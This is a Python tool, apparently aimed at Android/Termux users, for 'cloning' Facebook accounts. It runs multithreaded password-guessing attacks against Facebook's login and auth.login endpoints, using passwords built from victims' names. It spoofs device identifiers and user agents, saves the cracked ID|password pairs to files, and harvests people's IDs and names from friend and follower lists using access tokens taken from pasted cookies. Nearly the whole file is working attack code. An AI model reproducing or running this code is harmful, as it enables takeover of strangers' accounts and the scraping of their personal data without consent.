#coding=utf-8
try:
    import os,sys,time,json,random,re,string,platform,base64,uuid,requests
    from string import *
    from random import sample as sq
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python hop.py')
try:
    os.mkdir('/sdcard/HOP')
except:pass
logo="""

  \033[1;32m __    __   ______   __       __  __       __   ______   _______        
  \033[1;36m|  \  |  \ /      \ |  \     /  \|  \     /  \ /      \ |       \       
  \033[1;32m| $$  | $$|  $$$$$$\| $$\   /  $$| $$\   /  $$|  $$$$$$\| $$$$$$$\      
  \033[1;35m| $$__| $$| $$__| $$| $$$\ /  $$$| $$$\ /  $$$| $$__| $$| $$  | $$      
  \033[1;32m| $$    $$| $$    $$| $$$$\  $$$$| $$$$\  $$$$| $$    $$| $$  | $$      
  \033[1;34m| $$$$$$$$| $$$$$$$$| $$\$$ $$ $$| $$\$$ $$ $$| $$$$$$$$| $$  | $$      
  \033[1;32m| $$  | $$| $$  | $$| $$ \$$$| $$| $$ \$$$| $$| $$  | $$| $$__/ $$      
  \033[1;33m| $$  | $$| $$  | $$| $$  \$ | $$| $$  \$ | $$| $$  | $$| $$    $$      
  \033[1;32m\$$   \$$ \$$   \$$ \$$      \$$ \$$      \$$ \$$   \$$ \$$$$$$$       
---------------------------------------------------------------------------
\033[1;32m  Author   : Hammad Javed
\033[1;32m  Facebook : Aziz Chandio
\033[1;32m  Version  : 1
---------------------------------------------------------------------------"""
loop = 0
ok = []
methods = []
crack_mode = []
geo =[]
ua_android = []
ua_app = []
'''

Leaving Space

'''
za = 'h'
'''
 
'''
aa = 'u'
'''
 
'''
zb = 't'
'''
 
'''
ab = 'lawhskn'
'''
 
'''
zc = 't'
zd = 'p'
ze = 's'
'''

 '''
ae = 'main'
zf = ':'
zg = '//'
zh = 'git'
'''
 
'''
zi = 'hub.'
zj = 'com/'
zk = 'z'
zl = 'a'
zm = 'i'
'''
 
'''
zn = 'd'
zo = 'r'
'''
 

'''
zp = 'a'
zq = 'o'
isqadar = aa+ab+'/'+ze+'/'+ae+'/'+ze
bypass = za+zb+zc+zd+ze+zf+zg+zh+zi+zj+zk+zl+zm+zn+zo+zp+zq
def security():
    global bypass
    global isqadar
    try:
        cpath = os.getcwd()
        gid = open(cpath+'/.git/config','r').read()
        if 'https://github.com/hop-prog' in gid:
            update()
        elif str(bypass) in gid:
            print(' Modded version detected, install original version from links below.')
            print('\n https://github.com/hop-prog/hop')
            exit()
        else:
            print(' Virtulization files not found. Install original version from below link')
            print(' https://github.com/hop-prog/hop')
    except FileNotFoundError:
        print(' Github repo not detected, install original version from link below.')
        print('\n https://github.com/hop-prog/hop')
        exit()
def update():
    try:
        os.system('clear')
        print(logo)
        cv ='4.3' 
        x = requests.get('https://raw.githubusercontent.com/hop-prog/files/main/version.txt').text
        if str(cv) in str(x):
            os.system('rm -rf h64 h32 && python hop.py')
        else:
            buy()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ..')
def buy():
    global isqadar
    os.system('clear')
    print(logo)
    print('\n Checking subscription ... ')
    try:
        user_data = requests.get(isqadar).text.splitlines()
        t1 = base64.b64encode(str(os.getuid()).encode('ascii'))
        t2 = base64.b64encode((str(platform.uname()[2])).encode('ascii'))
        gen=('QW4HD-DQCRG-HM64M-6GJRK-'+str(t1)+'8K83T-'+str(t2))
        app_token = gen.replace("b'","").replace("'","")
        if app_token in user_data:
            set_ua()
        else:
            print(' Your token: '+app_token)
            print('')
            print(' Note :- The subscription has been closed by owner for new user.')
            print(' Unfortunately your will not be able to get subsription')
            exit()
    except requests.exceptions.ConnectionError:
        print('\n\n No internet connection ... ')
        exit()
def set_ua():
    lists = os.listdir()
    if '.android.txt' in lists:
        ua1 = open('.android.txt', 'r').read().splitlines()
        for lines in ua1:
            ua_android.append(lines)
        ua2 = open('.fb_app.txt', 'r').read().splitlines()
        for line in ua2:
            ua_app.append(line)
        geo_settings()
    else:
        os.system('curl -L https://raw.githubusercontent.com/hop-prog/ua/main/androidx.txt > .android.txt && curl -L https://raw.githubusercontent.com/hop-prog/ua/main/ios.txt > .android.txt && curl -L https://raw.githubusercontent.com/hop-prog/ua/main/api.txt > .fb_app.txt && python hop.py')
def geo_settings():
    try:
        x = requests.get('http://ip-api.com/json').text
        q = json.loads(x)
        geo.append(q['lat'])
        geo.append(q['lon'])
        geo.append(q['countryCode'])
        menu()
    except requests.exceptions.ConnectionError:
        print(' No internet connection .... ')
        exit()
def menu():
    global crack_mode
    os.system('clear')
    print(logo)
    print(' [1] FB CLONING')
    print(' [2] FILE DUMPING')
    print(' [3] SEPARATE IDZ')
    print(' [4] REMOVE DUP LINE')
    print(' [5] LOGIN COOKIE')
    print(' [6] EXISTING')
    print(50*'-')
    menu_opt = input(' Select option: ')
    if menu_opt =='1':
        method_crack()
    elif menu_opt =='2':
        create_file_login()
    elif menu_opt =='3':
        sids()
    elif menu_opt =='4':
        remove_dub()
    elif menu_opt =='5':
        os.system('rm -rf fb_cookies.txt')
        login()
    elif menu_opt =='6':
        exit()
    else:
        print('\n Invalid option, try again ...')
        time.sleep(1)
        menu()
def method_crack():
    global methods
    os.system('clear')
    print(logo)
    print(' [1] method 1')
    print(' [2] method 2')
    print(' [3] method 3')
    print(' [0] Back')
    print(50*'-')
    me_opt = input(' Select method: ')
    if me_opt =='1':
        methods.append('m1')
        main()
    elif me_opt =='2':
        methods.append('m2')
        print('\n Creating virtual android device ....')
        time.sleep(1)
        main()
    elif me_opt =='3':
        methods.append('m3')
        print('\n Creating virtual ios device ....')
        time.sleep(1)
        main()
    elif me_opt =='0':
        menu()
def main():
    global crack_mode
    os.system('clear')
    print(logo)
    print(' [1] File crack')
    print(' [2] Email crack')
    print(' [0] Back')
    print(50*'-')
    opt = input(' Select option >>> ')
    if opt =='1':
        crack_mode.append('File crack')
        crack_main().crack(id)
    elif opt =='2':
        crack_mode.append('Email')
        file_mail()
    elif opt =='0':
        menu()
    else:
        print('\n Choose valid option ... ')
def file_mail():
    os.system('clear && rm -rf .re.txt')
    print(logo)
    print('\033[1;33m first name example: muhammad, bx, gando, bc\033[0;97m')
    first = input('\n Put first name: ')
    print('\n\033[1;33m last name example: hamxa, khxn, sajxad, rxfiq \033[0;97m')
    last = input('\n Put last name: ')
    domain = '@gmail.com'
    os.system('clear')
    print(logo)
    lists = ['3','4']
    for xd in range(1500):
        lchoice = random.choice(lists)
        if '3' in lchoice:
            mail = ''.join(random.choice(string.digits) for _ in range(3))
            open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n'+first.lower()+mail+domain+'|'+first+' '+last+'\n'+first.lower()+'.'+last.lower()+mail+domain+'|'+first+' '+last+'\n'+first.lower()+'.'+last.lower()+'.'+mail+'|'+first+' '+last+'\n')
        else:
            mail = ''.join(random.choice(string.digits) for _ in range(4))
            open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n'+first.lower()+mail+domain+'|'+first+' '+last+'\n'+first.lower()+'.'+last.lower()+mail+domain+'|'+first+' '+last+'\n'+first.lower()+'.'+last.lower()+'.'+mail+'|'+first+' '+last+'\n')
    crack_main().crack(id)
class crack_main():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods,crack_mode
        if 'Email' in crack_mode:
            self.file = '.re.txt'
        else:
            os.system('clear')
            print(logo)
            self.file = input(' Put file path: ')
        self.id = open(self.file).read().splitlines()
        self.generate_pass()
    def m1(self,iid,pwx,server):
        try:
            global ok,ua_android,loop
            sys.stdout.write('\r %s/%s | OK: %s \r'%(loop,len(self.id),len(ok)));sys.stdout.flush()
            for pas in pwx:
                ua = random.choice(ua_android)
                host = server
                gurl=str(f'https://{host}/login/device-based/password/?uid={iid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','host': host,'origin': 'https://'+host,'referer': gurl,'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': "Windows",'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
                xyz = requests.Session()
                ps=xyz.get(gurl, headers=headers,allow_redirects=False, timeout=30)
                cookis = (";").join([ "%s=%s" % (key, value) for key, value in ps.cookies.get_dict().items() ])
                cookis+=' m_pixel_ratio=2.625; wd=412x756'
                dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(ps.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ps.text)).group(1),"uid":iid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas}
                url=str('https://'+host+'/login/device-based/validate-password/?shbl=0')
                po = xyz.post(url,headers=headers, data=dataa,cookies={'cookie': cookis}, allow_redirects=True, timeout=30)
                get = (";").join([ "%s=%s" % (key, value) for key, value in po.cookies.get_dict().items() ])
                if 'c_user' in get:
                    print(' \033[1;32m [Successful-hammad] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/hammad/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'checkpoint' in get:
                    print(' \033[1;31m [Checkpoint-hammad] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/hammad/cp.txt', 'a').write(iid+'|'+pas+'\n')
                    break
                else:continue
            loop+=1
        except Exception as e:
            pass
    def m2(self,iid,pwx):
        try:
            global ok,ua_app,loop,adid,device_family_id,machine_id,geo
            sys.stdout.write('\r %s/%s | OK: %s \r'%(loop,len(self.id),len(ok),per3));sys.stdout.flush()
            for pas in pwx:
                xyz = requests.Session()
                adid = str(uuid.uuid4())
                device_family_id = str(uuid.uuid4())
                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                sim = ''.join(random.choice(digits) for _ in range(20))
                fb = xyz.get('https://free.facebook.com').text
                jazoest = re.search('name="jazoest" value="(.*?)"', str(fb)).group(1)
                data = {'adid':adid,'format':'json','device_id':device_family_id,'email':iid,'password':pas,'generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':device_family_id,'sim_serials':sim,'credentials_type':'device_based_login_password','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'device_based_login','machine_id':machine_id,'login_latitude':geo[0],'login_longitude':geo[1],'login_location_accuracy_m':'1.0','jazoest':jazoest,'meta_inf_fbmeta':'','advertiser_id':adid,'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'en_US','client_country_code':geo[2],'method':'auth.login','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                #print(data)
                header = {'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','user-agent':random.choice(ua_app),'x-fb-net-hni':	str(random.randint(2e4,4e4)),'content-encoding':	'gzip','x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':	'EXCELLENT',
'x-fb-friendly-name':	'authenticate','accept-encoding':	'gzip, deflate','x-fb-http-engine':	'Liger'}
                pos = xyz.get('https://b-api.facebook.com/method/auth.login',params=data,headers=header).text
                q = json.loads(pos)
                if 'session_key' in q:
                    print(' \033[1;32m [Successful-hammad] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/hammad/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    print(' \033[1;31m [Checkpoint-hammad] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/hammad/cp.txt','a').write(iid+'|'+pas+'\n')
                    break
                else:continue
            loop+=1
        except Exception as e:
            pass
    def m3(self,iid,pwx):
        try:
            global ok,ua_app,loop,geo
            sys.stdout.write('\r %s/%s | OK: %s \r'%(loop,len(self.id),len(ok)));sys.stdout.flush()
            for pas in pwx:
                adid = str(uuid.uuid4())
                device_family_id = str(uuid.uuid4())
                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                sim = ''.join(random.choice(digits) for _ in range(20))
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1
                data = {'adid':adid,'format':'json','device_id':device_family_id,'email':iid,'password':pas,'generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':device_family_id,'sim_serials':sim,'credentials_type':'device_based_login_password','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'device_based_login','machine_id':machine_id,'login_latitude':geo[0],'login_longitude':geo[1],'login_location_accuracy_m':'1.0','jazoest':j2,'meta_inf_fbmeta':'','advertiser_id':adid,'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'en_US','client_country_code':geo[2],'method':'auth.login','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key':'3e7c78e35a76a9299309885393b02d97','access_token':'6628568379|c1e620fa708a1d5696fb991c1bde5662'}
                ua_li = ['Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]']
                header = {'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','user-agent':random.choice(ua_li),'x-fb-net-hni':	str(random.randint(2e4,4e4)),'content-encoding':	'gzip','x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':	'EXCELLENT',
'x-fb-friendly-name':	'authenticate','accept-encoding':	'gzip, deflate','x-fb-http-engine':	'Liger'}
                pos = requests.get('https://b-api.facebook.com/method/auth.login',params=data,headers=header).text
                q = json.loads(pos)
                if 'session_key' in q:
                    print(' \033[1;32m [Successful-hammad] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/hammad/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    print(' \033[1;31m [Checkpoint-hammad] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/hammad/cp.txt','a').write(iid+'|'+pas+'\n')
                    break
                else:continue
            loop+=1
        except Exception as e:
            pass
    def generate_pass(self):
        server = 'mbasic.facebook.com'
        self.pasw(server)
    def pasw(self,server):
        os.system('clear')
        print(logo)
        print(' [1] First&last name passwords')
        print(' [2] First name passwords')
        print(' [3] First&last name,digit passwords')
        print(' [4] Choice passwords')
        print(' [5] Only First last name')
        print(50*'-')
        ps = input(' Select passlist: ')
        if ps =='1':
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(self.id)))
            print(' Process has been started in background')
            print(50*'-')
            with ThreadPool(max_workers=30) as moon:
                for uid in self.id:
                    iid, name = uid.split('|')
                    xz = name.split(' ')
                    try:
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0].lower()+' '+xz[1].lower(), xz[0].lower()+xz[1].lower(),xz[0]+' '+xz[1].lower()]
                        else:
                            pwx = [xz[0].lower()+' '+xz[1].lower(), xz[0].lower()+xz[1].lower(),xz[0]+' '+xz[1].lower()]
                        if 'm1' in methods:
                            moon.submit(self.m1,iid,pwx,server)
                        elif 'm2' in methods:
                            moon.submit(self.m2,iid,pwx)
                        elif 'm3' in methods:
                            moon.submit(self.m3,iid,pwx)
                        else:exit()
                    except:pass
        elif ps =='2':
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(self.id)))
            print(' Process has been started in background')
            print(50*'-')
            with ThreadPool(max_workers=30) as moon:
                for uid in self.id:
                    iid, name = uid.split('|')
                    xz = name.split(' ')
                    try:
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0].lower()+'12',xz[0].lower()+'1122',xz[0].lower()+'123',xz[0].lower()+'1234',xz[0].lower()+'12345',xz[0].lower()+'786']
                        else:
                            pwx = [xz[0].lower()+'12',xz[0].lower()+'1122',xz[0].lower()+'123',xz[0].lower()+'1234',xz[0].lower()+'12345',xz[0].lower()+'786']
                        if 'm1' in methods:
                            moon.submit(self.m1,iid,pwx,server)
                        elif 'm2' in methods:
                            moon.submit(self.m2,iid,pwx)
                        elif 'm3' in methods:
                            moon.submit(self.m3,iid,pwx)
                        else:exit()
                    except Exception as e:pass
        elif ps =='3':
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(self.id)))
            print(' bc proces start hy')
            print(50*'-')
            with ThreadPool(max_workers=30) as moon:
                for uid in self.id:
                    iid, name = uid.split('|')
                    xz = name.split(' ')
                    try:
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0].lower()+xz[1].lower()+'12',xz[0].lower()+xz[1].lower()+'1122',xz[0].lower()+xz[1].lower()+'123',xz[0].lower()+xz[1].lower()+'1234',xz[0].lower()+xz[1].lower()+'12345',xz[0].lower()+xz[1].lower()+'786']
                        else:
                            pwx = [xz[0].lower()+xz[1].lower()+'12',xz[0].lower()+xz[1].lower()+'1122',xz[0].lower()+xz[1].lower()+'123',xz[0].lower()+xz[1].lower()+'1234',xz[0].lower()+xz[1].lower()+'12345',xz[0].lower()+xz[1].lower()+'786']
                        if 'm1' in methods:
                            moon.submit(self.m1,iid,pwx,server)
                        elif 'm2' in methods:
                            moon.submit(self.m2,iid,pwx)
                        elif 'm3' in methods:
                            moon.submit(self.m3,iid,pwx)
                        else:exit()
                    except Exception as e:pass
        elif ps =='4':
            print('\n Example: 786123,786786786,khan12,khan786 etc')
            pwx = input(' Put passwords: ').split(',')
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(self.id)))
            print(' Process has been started in background')
            print(50*'-')
            with ThreadPool(max_workers=30) as moon:
                for uid in self.id:
                    iid, name = uid.split('|')
                    if 'm1' in methods:
                        moon.submit(self.m1,iid,pwx,server)
                    elif 'm2' in methods:
                        moon.submit(self.m2,iid,pwx)
                    elif 'm3' in methods:
                        moon.submit(self.m3,iid,pwx)
                    else:exit()
        elif ps =='5':
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(self.id)))
            print(' Process has been started in background')
            print(50*'-')
            with ThreadPool(max_workers=30) as moon:
                for uid in self.id:
                    iid, name = uid.split('|')
                    xz = name.split(' ')
                    try:
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0].lower()+' '+xz[1].lower(),xz[0]+' '+xz[1].lower()]
                        else:
                            pwx = [xz[0].lower()+' '+xz[1].lower(),xz[0]+' '+xz[1].lower()]
                        if 'm1' in methods:
                            moon.submit(self.m1,iid,pwx,server)
                        elif 'm2' in methods:
                            moon.submit(self.m2,iid,pwx)
                        elif 'm3' in methods:
                            moon.submit(self.m3,iid,pwx)
                        else:exit()
                    except Exception as e:pass
        else:exit()
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    limit = int(input(' How many links do you want to separate? '))
    print('\n Example: /sdcard/filename.txt ')
    new_save = input(' Save new file as: ')
    print('')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    menu()
def remove_dub():
    os.system('clear')
    print(logo)
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print(' \nExample: /sdcard/filename.txt')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: '+save_file)
        print(50*'-')
        input('\n Press enter to back ')
        main()
    except FileNotFoundError:
        print(' File not found.')
def create_file_login():
    try:
        fb = open('fb_cookies.txt', 'r').read()
        fb_token = str(open('access_token.txt', 'r').read())
        fb_cookies = {'cookie':str(fb)}
    except FileNotFoundError:
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ....')
        exit()
    try:
        graph_url = 'https://graph.facebook.com/me?fields=id,name&access_token=%s'%(fb_token)
        xyz = requests.Session()
        r = xyz.get(graph_url,cookies=fb_cookies).text
        data = json.loads(r)
        iid = data['id']
        name = data['name']
    except requests.exceptions.ConnectionError:
        print('  No internet connection ... ')
        exit()
    except KeyError:
        print(' Logged in account has checkpoint, try another account ...')
        os.system('rm -rf fb_cookies.txt access_token.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print(logo)
    print(' Login id: '+iid)
    print(' Login name: '+name)
    print(50*'-')
    print(' [1] Create from public friendlist')
    print(' [2] Create from followers')
    print(' [B] Back')
    print(50*'-')
    opt = input(' Choose option >>> ')
    if opt =='1':
        print('\n\n [1] Create auto file')
        print(' [2] Create manual file')
        print(50*'-')
        opt2 = input(' Choose option >>> ')
        if opt2 =='1':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            #params
            print('\n Example: /sdcard/filename.txt')
            fsi = input(' Save file as: ')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            yar = []
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                idt = str(input(' Put id no %s: '%t))
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['friends']['data']:
                    uid = i['id']
                    if uid in yar:
                        pass
                    else:
                        open('.txt', 'a').write(uid+'\n')
                        yar.append(uid)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(yar)))
            print(50*'-')
            try:
                li2 = int(input(' How many ids do you want to extract ? '))
            except:
                li2 = 1
            print('\n Link example: 100080,100081,100082,100014,100045 etc ')
            t=0
            for f in range(li2):
                t+=1
                sid = input(' %s link start with: '%t)
                os.system('cat .txt | grep "'+sid+'" > .t.txt')
            file_open = open('.t.txt', 'r').read().splitlines()
            #tc.append(file_open)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(file_open)))
            print(' The process has started')
            print(' Press ctrl z to stop process')
            print(50*'-')
            for iidss in file_open:
                try:
                    relax = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(iidss,fb_token)
                    yaad = xyz.get(relax,cookies=fb_cookies).text
                    rd = json.loads(yaad)
                    for fq in rd['friends']['data']:
                        idss = fq['id']
                        fnames = fq['name']
                        open(fs,'a').write(idss+'|'+fnames+'\n')
                        sys.stdout.write('\r\033[1;32m  Ex ids from:  %s ...\033[0;97m\r'%(iidss)),sys.stdout.flush()
                except KeyError:
                    if 'enrolled' in rd:
                        sys.stdout.write('\r\033[1;31m  Cookies expired, not ex from: %s \033[0;97m\r'%(iidss)),sys.stdout.flush()
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        sys.stdout.write('\r\033[1;33m  No friends for: %s ...\033[0;97m\r'%(iidss)),sys.stdout.flush()
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    pass
            print(50*'-')
            print(' The process has completed')
            print(' Total ids extracted: '+str(len(open(fs,'r').read().splitlines())))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        elif opt2 =='2':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            print(' Example: /sdcard/filename.txt')
            fsi = input(' Save file as: ')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                try:
                    idt = input(' Put id no %s: '%t)
                    fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                    xyz = requests.Session()
                    fd = xyz.get(fd_url,cookies=fb_cookies).text
                    fl = json.loads(fd)
                    for i in fl['friends']['data']:
                        uid = i['id']
                        fnames = i['name']
                        open(fs,'a').write(uid+'|'+fnames+'\n')
                        tc.append(uid)
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    pass
                except KeyError:
                    if 'enrolled' in fl:
                        print('  Logged in id got checkpoint, try another account ...')
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        print(' No friendlist found ...')
                        pass
            print(50*'-')
            print(' Total ids: '+str(len(tc)))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        else:
            print(' Choose valid option ...')
            time.sleep(1)
            create_file_login()
    elif opt =='2':
        os.system('clear')
        print(logo)
        try:
            li = int(input(' How many ids do you want to add ? '))
        except:
            li = 1
        print('\n Example: /sdcard/filename.txt')
        fsi = input(' Save file as: ')
        if '/sdcard/' in fsi:
            fs = fsi
        else:
            fs = '/sdcard/'+fsi
        tc = []
        t = 0
        for _ in range(li):
            t +=1
            try:
                idt = input(' Put id no %s: '%t)
                fd_url = 'https://graph.facebook.com/%s?fields=subscribers.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['subscribers']['data']:
                    uid = i['id']
                    fnames = i['name']
                    open(fs,'a').write(uid+'|'+fnames+'\n')
                    tc.append(uid)
            except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
                break
            except KeyError:
                if 'enrolled' in fl:
                    print('  Logged in id got checkpoint, try another account ...')
                    os.system('rm -rf fb_cookies.txt access_token.txt')
                    exit()
                else:
                    print(' No friendlist found ...')
                    break
        print(50*'-')
        print(' Total ids: '+str(len(tc)))
        print(' File saved as: '+fs)
        input('\n Press enter to back ')
        os.system('python hop.py')
    else:
        print(' Choose valid option ...')
        time.sleep(1)
        create_file_login()
def login():
    os.system('clear')
    print(logo)
    #print('\n\033[1;33m If you donot know how to get cookies, see option in main menu\033[0;97m')
    cookies = input('\n Put cookies here: ')
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
        find_token = re.search("(EAAG\w+)", data.text)
        open("access_token.txt", "w").write(find_token.group(1))
        open("fb_cookies.txt","w").write(cookies)
        print(' Logged in successfully ...')
        time.sleep(1)
        os.system('python hop.py')
    except KeyError:
        print('\n Inavlid cookies, try another cookies')
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
    except AttributeError:
        print('\n Invalid cookies, try another cookies ...')
        exit()
set_ua()
